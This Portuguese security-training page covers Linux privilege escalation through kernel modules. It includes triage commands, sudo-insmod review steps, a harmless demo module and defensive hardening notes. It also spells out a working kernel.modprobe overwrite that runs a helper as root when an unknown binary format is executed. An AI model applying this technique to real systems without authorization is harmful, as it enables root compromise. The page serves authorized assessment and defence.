# Abuso de Kernel Modules e modprobe

{{#include ../../banners/hacktricks-training.md}}

## Misconfigurações de Kernel module e carregamento de módulos

O suporte a Kernel modules é uma área de alto impacto durante a análise de privilege escalation no Linux. Não considere toda mensagem sobre módulo não assinado explorável por si só, mas use-a para responder a perguntas práticas:

- O usuário atual pode carregar módulos por meio de `sudo`, capabilities ou de um caminho de helper gravável?
- O carregamento de módulos ainda está habilitado?
- A imposição de assinatura de módulos está desabilitada?
- Os diretórios de módulos ou os arquivos de módulos podem ser gravados?
- Os logs do kernel podem ser lidos para confirmar o que aconteceu?

Triagem rápida:
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
cat /proc/sys/kernel/module_sig_enforce 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Interpretação:

- `modules_disabled=1` significa que novos módulos não podem ser carregados até a reinicialização.
- `module_sig_enforce=1` geralmente bloqueia módulos não assinados.
- `dmesg_restrict=0` permite que usuários sem privilégios leiam os logs do kernel em muitos sistemas.
- Caminhos com permissão de escrita em `/lib/modules/$(uname -r)/` são perigosos porque a descoberta e o carregamento automático de módulos podem confiar nessa árvore.

### Carregando um módulo e lendo a saída do kernel

Se você tiver permissão legítima para carregar um módulo local, `insmod` insere o arquivo `.ko` exato que você fornecer. A função de inicialização do módulo é executada imediatamente, e as mensagens escritas com `printk()` aparecem nos logs do kernel.

Fluxo de trabalho mínimo para ambientes de revisão ou laboratório:
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Se `sudo -l` permitir `insmod`, `modprobe` ou um wrapper em torno deles, trate isso como crítico:
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### `insmod` permitido pelo Sudo

Uma regra do sudo que permite a um usuário executar `insmod` não é comparável a permitir um helper administrativo normal. O código de inicialização do módulo é executado no contexto do kernel assim que o `.ko` é inserido, portanto, a pergunta prática durante a revisão é: "esse usuário pode escolher ou modificar o módulo que está sendo carregado?"

Fluxo de revisão genérico:
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Se o usuário puder fornecer um `.ko` arbitrário, a regra deverá ser tratada como comprometimento completo do sistema em uma avaliação autorizada. Um padrão operacional mais seguro é evitar delegar o carregamento de módulos por meio do sudo; se isso for inevitável, restrinja o caminho exato, o proprietário, as permissões, a política de assinatura e o fluxo de remoção.

Para um padrão inofensivo de compilação de módulos em um laboratório controlado, um código-fonte mínimo e um Makefile são:
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Compile e carregue apenas em um laboratório autorizado:
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### Verificações de abuso de `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` controla o auxiliar de userspace que o kernel invoca quando precisa de assistência para carregar módulos. Se um atacante puder alterá-lo para o caminho de um executável gravável e acionar um formato binário desconhecido ou outro caminho de solicitação de módulo, isso poderá resultar em execução de código como root.

Verifique o auxiliar atual:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Verifique se você consegue influenciá-lo:
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Padrão genérico somente para laboratório:
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger an unknown executable format so the kernel attempts helper logic
printf '\\xff\\xff\\xff\\xff' > /tmp/unknown
chmod +x /tmp/unknown
/tmp/unknown 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
Em sistemas reforçados, isso deve falhar porque usuários sem privilégios não podem escrever em `kernel.modprobe`, o caminho do helper não permite escrita ou os caminhos de carregamento de módulos estão bloqueados.

### Revisão de `/lib/modules` com permissão de escrita

Diretórios de módulos com permissão de escrita podem permitir a substituição de módulos, a instalação de módulos maliciosos ou o abuso do carregamento automático, dependendo de como `modprobe` for invocado posteriormente.

Revise os locais com permissão de escrita:
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Se você encontrar conteúdo de módulo com permissão de escrita, verifique como os módulos são descobertos:
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Notas defensivas:

- Mantenha `/lib/modules` pertencente a `root:root` e não gravável por usuários.
- Defina `kernel.modules_disabled=1` após a inicialização, quando for operacionalmente possível.
- Exija a assinatura de módulos em sistemas que necessitem de módulos carregáveis.
- Monitore gravações em `/proc/sys/kernel/modprobe`, `/lib/modules` e execuções inesperadas de `insmod`/`modprobe`.
{{#include ../../banners/hacktricks-training.md}}
